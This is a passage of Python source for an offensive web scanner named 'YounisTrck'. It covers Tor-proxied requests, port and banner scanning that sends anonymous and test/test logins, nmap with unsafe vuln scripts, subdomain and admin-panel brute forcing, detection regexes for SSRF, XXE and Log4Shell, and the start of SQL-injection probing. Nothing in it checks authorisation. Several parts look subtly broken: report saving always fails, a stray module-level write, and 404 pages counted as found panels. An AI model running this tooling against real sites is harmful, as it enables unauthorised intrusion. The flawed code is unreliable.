        'k8s_secrets': r"kubeconfig|ca.crt|namespace:\s*default",
        'cloud_metadata': r"169.254.169.254|metadata.google.internal"
    },
    
    
    "ssrf": {
        'internal_ips': r"127\.0\.0\.1|localhost|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])|0\.0\.0\.0",
        'cloud_metadata': r"169\.254\.169\.254|metadata\.google\.internal|metadata\.azure\.com",
        'url_schemes': r"file://|gopher://|dict://|sftp://|ldap://|tftp://",
        'private_networks': r"10\.|192\.168|172\.(1[6-9]|2[0-9]|3[0-1])"
    },
    
    
    "xxe": {
        'doctype_declaration': r"<!DOCTYPE[^>]*SYSTEM|<!ENTITY[^>]*SYSTEM",
        'external_entities': r"&[^;]+;|%[^;]+;",
        'xml_declaration': r"<\?xml[^>]*encoding=.*\?>"
    },
    
    
    "deserialization": {
        'java_serialized': r"rO0|ACED|STREAM",
        'php_serialized': r"O:[0-9]+:\"|a:[0-9]+:\{|s:[0-9]+:\"",
        'net_serialized': r"AAEAAAD////|TypeCode|ObjectStateFormatter",
        'python_pickle': r"cos|system|S'|p0|p1"
    },
    
    
    "template_injection": {
        'ssti_indicators': r"\$\{.*?\}|{{.*?}}|{%.*?%}|\[\[.*?\]\]|#{.*?}",
        'expression_language': r"T\(|@|#ctx|#request|#session|#application",
        'code_execution': r"__class__|__subclasses__|__globals__|__init__|__builtins__"
    }
}


MODERN_VULN_PATTERNS = {
    'log4shell': r"\$\{jndi:(ldap|ldaps|rmi|dns|iiop)://",
    'spring4shell': r"class\.module\.classLoader|ClassLoader|getClass\(\)",
    'deserialization': r"ObjectInputStream|readObject|Serializable|Java\.io",
    'template_injection': r"\$\{.*?\}|{{.*?}}|{%.*?%}|\[\[.*?\]\]",
     
    'cors_misconfig': r"Access-Control-Allow-Origin:\s*\*|Access-Control-Allow-Credentials:\s*true",
    'clickjacking': r"X-Frame-Options:\s*|Frame-Options:\s*",
    'hsts_missing': r"Strict-Transport-Security:\s*",
    'csp_missing': r"Content-Security-Policy:\s*",
    'info_disclosure': r"X-Powered-By:|Server:|X-AspNet-Version:",
    'csrf_vulnerable': r"csrf|token",
    'idor_patterns': r"id=\d+|user=\d+|account=\d+",
    'jwt_weak': r"eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*\.[A-Za-z0-9._-]*",
    'graphql_introspection': r"__schema|__type|__typename",
    'api_rate_limit': r"rate.*limit|throttle",
    'subdomain_takeover': r"404 Not Found|NoSuchBucket|The specified bucket does not exist",
    'cache_poisoning': r"X-Cache|X-Cache-Hits",
    'request_smuggling': r"Content-Length:|Transfer-Encoding:",
    'prototype_pollution': r"__proto__|constructor\.prototype",
    'web_cache_deception': r"\.css|\.js|\.png|\.jpg"
}


SCAN_CONFIG = {
    'timeouts': {
        'http': 10,
        'https': 10,
        'dns': 5,
        'ssh': 5,
        'database': 5
    },
    'threads': {
        'max_workers': 50,
        'network_scan': 20,
        'web_crawl': 10,
        'vuln_scan': 15,
        'subdomain_scan': 25
    },
    'rate_limits': {
        'requests_per_second': 10,
        'max_retries': 3,
        'backoff_factor': 1
    }
}


SUPPORTED_TECHNOLOGIES = {
    'frameworks': ['Spring', 'Django', 'Laravel', 'Rails', 'Express', 'Flask', 'FastAPI', 'Symfony', 'Yii', 'CodeIgniter'],
    'databases': ['MySQL', 'PostgreSQL', 'MongoDB', 'Redis', 'Elasticsearch', 'Oracle', 'SQLServer', 'SQLite', 'Cassandra'],
    'cloud_platforms': ['AWS', 'Azure', 'GCP', 'DigitalOcean', 'Heroku', 'Linode', 'Vultr', 'IBM Cloud', 'Oracle Cloud'],
    'containers': ['Docker', 'Kubernetes', 'Podman', 'Containerd', 'LXC', 'LXD'],
    'web_servers': ['Apache', 'Nginx', 'IIS', 'Tomcat', 'Jetty', 'WebLogic', 'WebSphere'],
    'programming_languages': ['PHP', 'Python', 'Java', 'JavaScript', 'Ruby', 'Go', 'Rust', 'C#', 'ASP.NET']
}

REPORT_DATA = {
    'DNS': {},
    'WHOIS': [],
    'GeoIP': {},
    'Banners': [],
    'Nmap_Results': [],
    'Subdomains': [],
    'ReverseIP': [],
    'RobotsTxt': {},
    'AdminPanels': [],
    'Vulnerabilities': [],
    'SSH_Banners': [],
    'DisallowedPaths': [],
    'MainIPs': [],
    'ScanLog': []
}

CRAWL_LIMIT = 100
RISK_LEVELS = {
    "CRITICAL": RED,
    "HIGH": RED,
    "MEDIUM": YELLOW,
    "LOW": BLUE,
    "INFO": CYAN
}
PROXIES = {}
TOR_PROXIES = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
username = getpass.getuser()
def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    clear_screen()
    print(BANNER)

def log_message(msg):
    if 'ScanLog' not in REPORT_DATA:
        REPORT_DATA['ScanLog'] = []
    REPORT_DATA['ScanLog'].append(msg)

def print_status(msg):
    log_message(f"[+] {msg}")
    print(f"{BLUE}[+] {msg}{RESET}")

def print_success(msg):
    log_message(f"[✓] {msg}")
    print(f"{GREEN}[✓] {msg}{RESET}")

def print_warning(msg):
    log_message(f"[!] {msg}")
    print(f"{YELLOW}[!] {msg}{RESET}")

def print_error(msg):
    log_message(f"[✗] {msg}")
    print(f"{RED}[✗] {msg}{RESET}")

def print_critical(msg):
    log_message(f"[🔥] {msg}")
    print(f"{RED}[🔥] {msg}{RESET}")

def print_risk(level, msg):
    log_message(f"[{level}] {msg}")
    print(f"{RISK_LEVELS[level]} {msg}")

def get_response(url, use_tor=False, method='GET', data=None, headers=None):
    proxies = TOR_PROXIES if use_tor else PROXIES
    current_headers = HEADERS.copy()
    if headers:
        current_headers.update(headers)
        
    try:
        if method.upper() == 'GET':
            response = requests.get(url, headers=current_headers, timeout=15, 
                                  allow_redirects=True, proxies=proxies,
                                  verify=False)
        elif method.upper() == 'POST':
            response = requests.post(url, headers=current_headers, data=data, timeout=15,
                                   allow_redirects=True, proxies=proxies,
                                   verify=False)
        else:
            print_error(f"Unsupported HTTP method: {method}")
            return None
        
        if response.status_code >= 400 and response.status_code < 600:
            print_warning(f"Received status code {response.status_code} for {url}")
            
        return response
    except requests.exceptions.RequestException as e:
        print_error(f"Request failed for {url}: {str(e)}")
        return None
    except Exception as e:
        print_error(f"An unexpected error occurred during request: {str(e)}")
        return None

def save_vulnerabilities(url):
    print_status(f"Attempting to save scan results for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain: 
            domain = url.split('//')[-1].split('/')[0].replace(':', '_') 
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        username = getpass.getuser()
        filename = f"YounisTrck-found-scan-{timestamp}_user-{username}_target-{domain}.txt"
        
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"=== Vulnerability Scan Report ===\n")
            f.write(f"Target URL: {url}\n")
            f.write(f"Scan Time: {datetime.now()}\n")
            f.write(f"Scanner User: {username}\n")
            f.write("===================================\n\n")
            
            
            if REPORT_DATA.get('DNS'):
                f.write("=== DNS Lookup Results ===\n")
                for record_type, records in REPORT_DATA['DNS'].items():
                    f.write(f"{record_type} Records:\n")
                    for record in records:
                        f.write(f"  - {record}\n")
                f.write("\n")

            
            if REPORT_DATA.get('WHOIS'):
                f.write("=== WHOIS Lookup Results ===\n")
                for entry in REPORT_DATA['WHOIS']:
                    f.write(f"Domain: {entry.get('domain', 'N/A')}\n")
                    f.write(f"Registrar: {entry.get('registrar', 'N/A')}\n")
                    f.write(f"Creation Date: {entry.get('creation_date', 'N/A')}\n")
                    f.write(f"Expiration Date: {entry.get('expiration_date', 'N/A')}\n")
                    if entry.get('name_servers'):
                        f.write(f"Name Servers: {', '.join(entry['name_servers'])}\n")
                f.write("\n")

            
            if REPORT_DATA.get('GeoIP'):
                f.write("=== GeoIP Lookup Results ===\n")
                data = REPORT_DATA['GeoIP']
                f.write(f"IP Address: {data.get('ip', 'N/A')}\n")
                f.write(f"City: {data.get('city', 'N/A')}\n")
                f.write(f"Region: {data.get('region', 'N/A')}\n")
                f.write(f"Country: {data.get('country', 'N/A')}\n")
                f.write(f"Location: {data.get('loc', 'N/A')}\n")
                f.write(f"ISP: {data.get('org', 'N/A')}\n")
                f.write("\n")
            
            
            if REPORT_DATA.get('Nmap_Results'):
                f.write("=== NMAP Port Scan Results ===\n")
                for result in REPORT_DATA['Nmap_Results']:
                    f.write(f"{result}\n")
                f.write("\n")

            
            if REPORT_DATA.get('SSH_Banners'):
                f.write("=== SSH Banners ===\n")
                for banner in REPORT_DATA['SSH_Banners']:
                    f.write(f"{banner}\n")
                f.write("\n")
            
            
            if REPORT_DATA.get('AdminPanels'):
                f.write("=== Admin Panel Discovery Results ===\n")
                for panel_info in REPORT_DATA['AdminPanels']:
                    f.write(f"URL: {panel_info['url']}, Status Code: {panel_info['status_code']}, Content Length: {panel_info['content_length']}\n")
                f.write("\n")

            
            if REPORT_DATA.get('RobotsTxt'):
                f.write("=== Robots.txt Content ===\n")
                f.write(REPORT_DATA['RobotsTxt']['content'])
                f.write("\n")
            
            
            if REPORT_DATA.get('ReverseIP'):
                f.write("=== Websites on the same IP (Reverse IP Lookup) ===\n")
                for site in REPORT_DATA['ReverseIP']:
                    f.write(f"- {site}\n")
                f.write("\n")

            
            if REPORT_DATA.get('MainIPs'):
                f.write("=== Primary IP Addresses ===\n")
                for ip_info in REPORT_DATA['MainIPs']:
                    f.write(f"Domain: {ip_info['domain']}, IP: {ip_info['ip']}\n")
                f.write("\n")
            
            
            if REPORT_DATA.get('Vulnerabilities'):
                f.write("=== DETECTED VULNERABILITIES ===\n")
                severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
                sorted_vulns = sorted(REPORT_DATA['Vulnerabilities'], 
                                      key=lambda x: severity_order.get(x.get('severity', 'INFO'), 5))
                                      
                for vuln in sorted_vulns:
                    f.write(f"[{vuln.get('severity', 'INFO')}] {vuln.get('type', 'Unknown')}\n")
                    if 'url' in vuln and vuln['url']:
                        f.write(f"  URL: {vuln['url']}\n")
                    if 'parameter' in vuln and vuln['parameter']:
                        f.write(f"  Parameter: {vuln['parameter']}\n")
                    if 'payload' in vuln and vuln['payload']:
                        f.write(f"  Payload Used: {vuln['payload']}\n")
                    if 'response_snippet' in vuln and vuln['response_snippet']:
                        f.write(f"  Response Snippet: {vuln['response_snippet']}\n")
                    if 'details' in vuln and vuln['details']:
                        f.write(f"  Details: {vuln['details']}\n")
                    f.write("-" * 20 + "\n")
            else:
                f.write("No specific vulnerabilities were detected.\n")
            
            
            f.write("\n=== FULL SCAN LOG ===\n")
            
            
            log_filename = f"YounisTrck-found-scan-{timestamp}_user-{username}_target-{domain}_FULL_LOG.txt"
            
            try:
                
                f.write(f"Scan completed at: {datetime.now()}\n")
                f.write(f"Target: {url}\n")
                f.write(f"Scanner: YounisTrck v10.4\n")
                f.write(f"User: {username}\n")
                f.write("="*50 + "\n")
                
                
                f.write(f"Full console output saved to: {log_filename}\n")
                
            except Exception as log_error:
                f.write(f"Error saving full log: {str(log_error)}\n")
                
            f.write("\n=== End of Report ===\n")
        
        
        try:
            with open(log_filename, 'w', encoding='utf-8') as log_file:
                log_file.write(f"=== FULL SCAN LOG - YounisTrck v10.4 ===\n")
                log_file.write(f"Target: {url}\n")
                log_file.write(f"Scan Time: {datetime.now()}\n")
                log_file.write(f"User: {username}\n")
                log_file.write("="*60 + "\n\n")
                
                
                log_file.write("=== SYSTEM INFORMATION ===\n")
                log_file.write(f"Python Version: {sys.version}\n")
                log_file.write(f"Platform: {sys.platform}\n")
                log_file.write(f"Current Directory: {os.getcwd()}\n")
                log_file.write("\n")
                
                
                log_file.write("=== SCAN SUMMARY ===\n")
                log_file.write(f"DNS Records Found: {len(REPORT_DATA.get('DNS', {}))}\n")
                log_file.write(f"WHOIS Entries: {len(REPORT_DATA.get('WHOIS', []))}\n")
                log_file.write(f"NMAP Results: {len(REPORT_DATA.get('Nmap_Results', []))}\n")
                log_file.write(f"Subdomains Found: {len(REPORT_DATA.get('Subdomains', []))}\n")
                log_file.write(f"Admin Panels Found: {len(REPORT_DATA.get('AdminPanels', []))}\n")
                log_file.write(f"Vulnerabilities Found: {len(REPORT_DATA.get('Vulnerabilities', []))}\n")
                log_file.write("\n")
                
                
                if REPORT_DATA.get('Vulnerabilities'):
                    log_file.write("=== VULNERABILITY DETAILS ===\n")
                    for vuln in REPORT_DATA['Vulnerabilities']:
                        log_file.write(f"Type: {vuln.get('type', 'Unknown')}\n")
                        log_file.write(f"Severity: {vuln.get('severity', 'INFO')}\n")
                        log_file.write(f"URL: {vuln.get('url', 'N/A')}\n")
                        if vuln.get('parameter'):
                            log_file.write(f"Parameter: {vuln['parameter']}\n")
                        if vuln.get('payload'):
                            log_file.write(f"Payload: {vuln['payload']}\n")
                        if vuln.get('details'):
                            log_file.write(f"Details: {vuln['details']}\n")
                        log_file.write("-" * 40 + "\n")
                
                log_file.write("\n=== RAW DATA ===\n")
                log_file.write(json.dumps(REPORT_DATA, indent=2, default=str))
                
        except Exception as full_log_error:
            print_error(f"Failed to create full log file: {str(full_log_error)}")
        
        print_success(f"Scan results saved successfully to: {filename}")
        print_success(f"Full detailed log saved to: {log_filename}")
        return filename
        
    except Exception as e:
        print_error(f"Failed to save scan results: {str(e)}")
        
        
        try:
            error_filename = f"/sdcard/exploits/ERROR_scan_{timestamp}.txt"
            with open(error_filename, 'w', encoding='utf-8') as error_file:
                error_file.write(f"Error during scan report generation:\n")
                error_file.write(f"Time: {datetime.now()}\n")
                error_file.write(f"Target: {url}\n")
                error_file.write(f"Error: {str(e)}\n")
                error_file.write(f"Traceback:\n{traceback.format_exc()}")
            print_success(f"Error details saved to: {error_filename}")
        except:
            pass
            
        return None

if REPORT_DATA.get('ScanLog'):
    f.write("=== Scan Log ===\n")
    for log_entry in REPORT_DATA['ScanLog']:
        f.write(f"{log_entry}\n")
    f.write("\n")


def dns_lookup(url):
    print_status(f"Performing DNS Lookup for {url}...")
    domain = urlparse(url).netloc
    if not domain:
        print_error("Could not extract domain from URL for DNS lookup.")
        return

    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
    
    resolver = dns.resolver.Resolver()
    resolver.timeout = 5
    resolver.lifetime = 5
    
    found_records = defaultdict(list) 
    
    for rtype in record_types:
        try:
            answers = resolver.resolve(domain, rtype)
            print_success(f"[{rtype}] Records found for {domain}:")
            for rdata in answers:
                record_str = str(rdata)
                print(f"    {record_str}")
                found_records[rtype].append(record_str)
        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
            continue 
        except Exception as e:
            print_error(f"Error resolving {domain} {rtype} records: {str(e)}")
    
    REPORT_DATA['DNS'] = found_records

def whois_lookup(url):
    print_status(f"Performing WHOIS Lookup for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain from URL for WHOIS lookup.")
            return
            
        w = whois.whois(domain)
        
        if not w.domain_name:
            print_warning(f"No WHOIS record found for {domain}")
            return

        print_success(f"WHOIS Information for: {domain}")
        print(f"  Domain Name: {w.domain_name[0] if w.domain_name else 'N/A'}")
        print(f"  Registrar: {w.registrar if w.registrar else 'N/A'}")
        print(f"  Creation Date: {w.creation_date if w.creation_date else 'N/A'}")
        print(f"  Expiration Date: {w.expiration_date if w.expiration_date else 'N/A'}")
        if w.name_servers:
            print(f"  Name Servers: {', '.join(w.name_servers)}")
        else:
            print("  Name Servers: N/A")
        
        REPORT_DATA['WHOIS'].append({
            'domain': str(w.domain_name[0]) if w.domain_name else 'N/A',
            'registrar': w.registrar if w.registrar else 'N/A',
            'creation_date': str(w.creation_date[0]) if w.creation_date else 'N/A',
            'expiration_date': str(w.expiration_date[0]) if w.expiration_date else 'N/A',
            'name_servers': w.name_servers if w.name_servers else []
        })
    except whois.parser.PywhoisError as e:
        print_error(f"WHOIS lookup failed for {domain}: {str(e)}")
    except Exception as e:
        print_error(f"An unexpected error occurred during WHOIS lookup: {str(e)}")

def geoip_lookup(url):
    print_status(f"Performing GeoIP Lookup for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain from URL for GeoIP lookup.")
            return
            
        ip = socket.gethostbyname(domain)
        
        response = get_response(f"https://ipinfo.io/{ip}/json")
        if response and response.status_code == 200:
            data = response.json()
            
            print_success(f"IP Address: {data.get('ip', 'N/A')}")
            print(f"  City: {data.get('city', 'N/A')}")
            print(f"  Region: {data.get('region', 'N/A')}")
            print(f"  Country: {data.get('country', 'N/A')}")
            print(f"  Location: {data.get('loc', 'N/A')}")
            print(f"  ISP: {data.get('org', 'N/A')}")
            
            REPORT_DATA['GeoIP'] = data
        else:
            print_error(f"Failed to get GeoIP data for {ip}. Status: {response.status_code if response else 'No Response'}")
            
    except socket.gaierror:
        print_error(f"Could not resolve hostname: {domain}")
    except Exception as e:
        print_error(f"Error during GeoIP lookup: {str(e)}")

def grab_banners(url):
    print_status(f"Grabbing Server Banners for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain for banner grabbing.")
            return

        ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 27017, 8080, 8443, 9000, 9200, 9300, 11211, 27017, 28017]
        
        found_banners_count = 0
        for port in ports:
            try:
                sock = socket.create_connection((domain, port), timeout=2) 
                
                banner_request = b"\r\n"
                if port in [80, 8080, 8443, 5000]:
                    banner_request = f"GET / HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: {USER_AGENT}\r\nConnection: close\r\n\r\n".encode()
                elif port == 22:
                    banner_request = b"SSH-2.0-OpenSSH_8.2p1\r\n"
                elif port == 21:
                    banner_request = b"USER anonymous\r\nPASS anonymous\r\n"
                elif port == 23:
                    banner_request = b"\r\n"
                elif port == 25:
                    banner_request = b"EHLO scanner.local\r\n"
                elif port == 110:
                    banner_request = b"USER test\r\nPASS test\r\n"
                elif port == 143:
                    banner_request = b"A0 LOGIN test test\r\n"
                elif port == 3306:
                    banner_request = b"\x0a\x00\x00\x00\x18"
                elif port == 5432:
                    banner_request = b"\x05\x00\x00\x03\x47"
                
                sock.sendall(banner_request)
                banner = sock.recv(4096).decode(errors='ignore').strip()
                
                if banner:
                    try:
                        service_name = socket.getservbyport(port, 'tcp')
                    except OSError:
                        service_name = "unknown"
                    print_success(f"Port {port} ({service_name}):")
                    print(f"  {banner}")
                    REPORT_DATA['Banners'].append(f"Port {port} ({service_name}):\n{banner}")
                    found_banners_count += 1
                sock.close()
            except (socket.timeout, ConnectionRefusedError, OSError):
                pass
            except Exception as e:
                print_error(f"Error grabbing banner on port {port}: {str(e)}")
        
        if found_banners_count == 0:
            print_warning("No service banners could be retrieved.")
    except Exception as e:
        print_error(f"An unexpected error occurred during banner grabbing: {str(e)}")

def nmap_scan(url):
    print_status(f"Performing NMAP Port Scan for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain for NMAP scan.")
            return
            
        try:
            ip_addresses = socket.gethostbyname_ex(domain)[2]
            if not ip_addresses:
                print_error(f"Could not resolve any IP addresses for {domain}.")
                return
            target_ip = ip_addresses[0]
        except socket.gaierror:
            print_error(f"Could not resolve hostname: {domain}")
            return

        scanner = nmap.PortScanner()
        nmap_args = f'--unprivileged -T4 -F --open -sV --script=default,vuln,banner,http-enum --script-args=unsafe=true -oN YounisTrck-found-scan-{timestamp}_user-{username}_target-nmap-{domain}.txt'
        
        print_status(f"Running NMAP with arguments: {nmap_args} on {target_ip}")
        scanner.scan(target_ip, arguments=nmap_args)
        
        if target_ip in scanner.all_hosts():
            host_info = scanner[target_ip]
            
            print_success(f"NMAP Scan Results for {target_ip}:")
            print(f"  Hostname: {host_info.hostname() if host_info.hostname() else 'N/A'}")
            print(f"  State: {host_info.state()}")
            if 'osmatch' in host_info and host_info['osmatch']:
                print(f"  Operating System: {host_info['osmatch'][0]['name']} (Accuracy: {host_info['osmatch'][0]['accuracy']}%)")
            
            found_ports = False
            for proto in host_info.all_protocols():
                if proto == 'tcp': 
                    ports = host_info[proto].keys()
                    for port in sorted(ports):
                        found_ports = True
                        state = host_info[proto][port]['state']
                        service = host_info[proto][port]['name']
                        version = host_info[proto][port].get('version', 'N/A')
                        product = host_info[proto][port].get('product', '')
                        extra_info = host_info[proto][port].get('extrainfo', '')
                        
                        banner = f"{product} {version}".strip()
                        if extra_info:
                            banner += f" ({extra_info})"
                            
                        print(f"  Port {port}/{proto}: {state} - {service}")
                        if banner and banner != "N/A":
                            print(f"    Banner/Version: {banner}")
                        
                        REPORT_DATA['Nmap_Results'].append(f"Port: {port}/{proto}, State: {state}, Service: {service}, Product: {product}, Version: {version}, Extra Info: {extra_info}")

            if not found_ports:
                print_warning("No open ports found by NMAP.")
        else:
            print_error(f"NMAP could not retrieve information for host: {target_ip}")
    except nmap.PortScannerError as e:
        print_error(f"NMAP error: {str(e)}. Make sure NMAP is installed ('sudo apt install nmap').")
    except Exception as e:
        print_error(f"An unexpected error occurred during NMAP scan: {str(e)}")

def subdomain_scanner(url):
    print_status(f"Scanning for Subdomains of {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain for subdomain scanning.")
            return []
            
        base_domain = ".".join(domain.split('.')[-2:])
        found_subdomains = []
        
        wordlist = COMMON_SUBDOMAINS + [
            "web", "server", "portal", "cms", "app", "dev", "staging",
            "mail", "email", "support", "help", "forum", "community",
            "shop", "store", "payment", "secure", "vpn", "cloud", "api",
            "admin", "login", "auth", "m", "mobile", "app", "beta",
            "prod", "production", "test", "staging", "uat", "stage",
            "dev", "development", "sandbox", "demo", "support", "help",
            "faq", "blog", "news", "careers", "contact", "about",
            "jobs", "careers", "partner", "partners", "sales", "salesforce",
            "billing", "account", "profile", "settings", "dashboard",
            "console", "gateway", "proxy", "cdn", "static", "assets",
            "files", "docs", "media", "images", "video", "download",
            "upload", "storage", "data", "backup", "db", "mysql", "pgsql",
            "mongo", "redis", "cache", "queue", "worker", "cron",
            "scheduler", "monitor", "metrics", "logs", "analytics", "reports",
            "email", "smtp", "imap", "pop3", "ftp", "sftp", "ssh",
            "telnet", "vpn", "rcon", "teamspeak", "discord", "slack",
            "jira", "confluence", "git", "github", "gitlab", "bitbucket",
            "jenkins", "docker", "kubernetes", "aws", "azure", "gcp",
            "cloud", "storage", "s3", "bucket", "azureblob", "googlecloud",
            "vpn", "proxy", "firewall", "gateway", "router", "dns",
            "webmail", "owa", "exchange", "outlook", "office",
            "sso", "oauth", "openid", "saml", "ldap", "active", "directory",
            "pay", "payment", "commerce", "gateway", "checkout", "order",
            "invoice", "receipt", "support", "helpdesk",
            "vpn", "remote", "access", "terminal", "ssh", "rdp"
        ]
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(lambda s, d: f"{s}.{d}" if socket.gethostbyname(f"{s}.{d}") else None, sub, base_domain): sub for sub in set(wordlist)}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found_subdomains.append(result)
                    print_success(f"Found subdomain: {result}")
                    REPORT_DATA['Subdomains'].append(result)
        
        if not found_subdomains:
            print_warning(f"No subdomains found for {base_domain} using the provided wordlist.")
        
        return found_subdomains
    except Exception as e:
        print_error(f"Error during subdomain scanning: {str(e)}")
        return []

def reverse_ip_lookup(url):
    print_status(f"Performing Reverse IP Lookup for {url}...")
    try:
        domain = urlparse(url).netloc
        if not domain:
            print_error("Could not extract domain for reverse IP lookup.")
            return
            
        ip = socket.gethostbyname(domain)
        
        response = get_response(f"https://api.hackertarget.com/reverseiplookup/?q={ip}")
        
        if response and response.status_code == 200:
            content = response.text
            if "No DNS A records found" in content:
                print_warning(f"No domains found on IP {ip}.")
            elif "API count exceeded" in content:
                print_error("HackerTarget API limit exceeded. Try again later.")
            else:
                domains = content.splitlines()
                print_success(f"Found {len(domains)} other domains hosted on the same IP ({ip}):")
                for i, site in enumerate(domains):
                    if i >= 10:
                        print(f"  ... and {len(domains) - 10} more.")
                        break
                    print(f"  - {site}")
                    
                REPORT_DATA['ReverseIP'] = domains 
        else:
            print_error(f"Failed to retrieve reverse IP lookup data. Status: {response.status_code if response else 'No Response'}")
            
    except socket.gaierror:
        print_error(f"Could not resolve hostname: {domain}")
    except Exception as e:
        print_error(f"Error during reverse IP lookup: {str(e)}")

def get_robots_txt(url):
    print_status(f"Fetching robots.txt from {url}...")
    try:
        robots_url = urljoin(url, '/robots.txt')
        response = get_response(robots_url)
        
        if response and response.status_code == 200:
            content = response.text
            print_success("Successfully fetched robots.txt:")
            print("-" * 30)
            print(content)
            print("-" * 30)
            REPORT_DATA['RobotsTxt'] = {'url': robots_url, 'content': content}
            
            disallowed_paths = []
            for line in content.splitlines():
                if line.lower().startswith('disallow:'):
                    path = line[len('disallow:'):].strip()
                    if path:
                        disallowed_paths.append(path)
            if disallowed_paths:
                REPORT_DATA['DisallowedPaths'] = disallowed_paths
                print_success(f"Found {len(disallowed_paths)} disallowed paths in robots.txt.")
                
        elif response and response.status_code == 404:
            print_warning("robots.txt not found at this location.")
        else:
            print_warning(f"Could not fetch robots.txt. Status code: {response.status_code if response else 'No Response'}")
            
    except Exception as e:
        print_error(f"Error fetching robots.txt: {str(e)}")

def check_admin_panels(url):
    print_status(f"Checking for common Admin Panels at {url}...")
    found_panels = []
    
    ADMIN_PANELS_TO_CHECK = [
        "wp-admin", "administrator/", "admin1/", "admin2/", "admin3/", "admin4/", "admin5/",
        "usuarios/", "usuario/", "wp-login.php", "webadmin/", "adminarea/", "bb-admin/",
        "adminLogin/", "admin_area/", "panel-administracion/", "instadmin/", "memberadmin/",
        "administratorlogin/", "adm/", 
        "admin/account.php", "admin/index.php", "admin/login.php", "admin/admin.php", 
        "admin/account.php", "admin_area/admin.php", "admin_area/login.php", 
        "siteadmin/login.php", "siteadmin/index.php", "wp-admin/admin-ajax.php", 
        "admin/account.html",
        "login.php", "login.html", "admin_login.php", "admin_login.html",
        "phpmyadmin/", "phpMyAdmin/", 
        "mysql/admin/", "mysql/manager/", 
        "cpanel/", "webmail/", "whm/", 
        "plesk/", 
        "admin.php", "administrator.php", "siteadmin.php",
        "dashboard.php", "backend.php", "cp.php",
        "admin_dash.php", "sysadmin.php", "superadmin.php"
    ]
    
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {}
        for panel in ADMIN_PANELS_TO_CHECK:
            panel_url = urljoin(url, panel)
            futures[executor.submit(lambda u: (u, get_response(u, headers={'User-Agent': USER_AGENT})), panel_url)] = panel_url

        for future in as_completed(futures):
            panel_url, response = future.result()
            
            if response:
                status = response.status_code
                content_length = int(response.headers.get('Content-Length', -1))
                
                if status in [200, 204, 301, 302, 307, 401, 403, 404, 405, 500] and content_length > 50:
                    print_success(f"Potential Admin Panel found: {panel_url} (Status: {status}, Length: {content_length})")
                    found_panels.append({'url': panel_url, 'status_code': status, 'content_length': content_length})
                    REPORT_DATA['AdminPanels'].append({'url': panel_url, 'status_code': status, 'content_length': content_length})
            
    if not found_panels:
        print_warning("No common admin panels detected.")

def check_vulnerability_patterns(url, vuln_type, patterns, parameter=None, method='GET', data=None):
    try:
        if parameter:
            base_url = urlparse(url)._replace(query="").geturl()
            
            if method.upper() == 'GET':
                original_params = parse_qs(urlparse(url).query)
                
                for pattern in patterns:
                    test_url = urljoin(base_url, urlparse(url).path)
                    current_params = original_params.copy()
                    current_params[parameter] = [pattern]
                    
                    query_string = "&".join([f"{k}={quote(v[0])}" for k, v in current_params.items()])
                    test_url = f"{test_url}?{query_string}"
                    
                    response = get_response(test_url)
                    if response and response.text:
                        for error_sign in patterns: 
                            if error_sign in response.text:
                                print_risk("HIGH", f"{vuln_type} Detected! Payload: '{pattern}' at {test_url}")
                                REPORT_DATA['Vulnerabilities'].append({
                                    'type': vuln_type,
                                    'url': test_url,
                                    'parameter': parameter,
                                    'payload': pattern,
                                    'severity': "HIGH",
                                    'response_snippet': response.text
                                })
                                return True 
                                
            elif method.upper() == 'POST':
                response = get_response(url, method='POST', data={**data, parameter: pattern} if data else {parameter: pattern})
                if response and response.text:
                    for error_sign in patterns:
                        if error_sign in response.text:
                            print_risk("HIGH", f"{vuln_type} Detected! Payload: '{pattern}' at {url} (POST)")
                            REPORT_DATA['Vulnerabilities'].append({
                                'type': vuln_type,
                                'url': url,
                                'parameter': parameter,
                                'payload': pattern,
                                'severity': "HIGH",
                                'response_snippet': response.text
                            })
                            return True
        else: 
            for pattern in patterns:
                response = get_response(url + pattern if url.endswith('/') else url + '/' + pattern)
                if response and response.text:
                    for error_sign in patterns:
                        if error_sign in response.text:
                            print_risk("HIGH", f"{vuln_type} Detected! Payload: '{pattern}' at {url + pattern}")
                            REPORT_DATA['Vulnerabilities'].append({
                                'type': vuln_type,
                                'url': url + pattern,
                                'payload': pattern,
                                'severity': "HIGH",
                                'response_snippet': response.text
                            })
                            return True
                
    except Exception as e:
        print_error(f"Error checking {vuln_type}: {str(e)}")
    return False

def sql_injection_scan(url):
    print_status(f"Scanning for SQL Injection vulnerabilities at {url}...")
    found = False
    try:
        response = get_response(url)
        if not response:
            return False
            
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()
            form_url = urljoin(url, action) if action else url
            
            inputs = form.find_all('input', {'name': True}) 
            
            for input_tag in inputs:
                param_name = input_tag.get('name')
                if param_name:
